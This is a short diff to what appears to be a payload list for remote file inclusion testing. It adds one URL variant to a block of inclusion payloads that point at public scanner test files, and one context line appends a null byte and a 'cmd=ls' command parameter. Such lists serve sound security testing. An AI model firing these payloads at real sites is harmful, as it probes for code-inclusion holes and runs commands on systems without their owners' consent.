@@ -45,6 +45,7 @@ https://rfi.nessus.org/rfi.txt
 
 ```
 HTTps://cirt.net/rfiinc.txt
+https://cirt.net/rfiinc.txt?
 https://cirt.net/rfiinc.txt??
 https://cirt.net/rfiinc.txt?%00&cmd=ls
 ```
